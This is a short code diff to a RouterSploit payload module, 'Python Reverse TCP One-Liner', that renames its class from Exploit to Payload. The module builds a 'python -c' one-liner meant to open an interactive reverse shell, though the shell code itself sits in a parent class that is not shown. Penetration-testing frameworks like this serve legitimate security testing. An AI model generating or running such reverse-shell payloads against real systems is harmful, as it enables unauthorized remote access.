@@ -1,8 +1,8 @@
 from routersploit.core.exploit import *
-from routersploit.modules.payloads.python.reverse_tcp import Exploit as PythonReverseTCP
+from routersploit.modules.payloads.python.reverse_tcp import Payload as PythonReverseTCP
 
 
-class Exploit(PythonReverseTCP):
+class Payload(PythonReverseTCP):
     __info__ = {
         "name": "Python Reverse TCP One-Liner",
         "description": "Creates interactive tcp reverse shell by using python one-liner.",
@@ -14,7 +14,7 @@ class Exploit(PythonReverseTCP):
     cmd = OptString("python", "Python binary")
 
     def generate(self):
-        payload = super(Exploit, self).generate()
+        payload = super(Payload, self).generate()
 
         cmd = '{} -c "{}"'.format(self.cmd, payload)
         return cmd
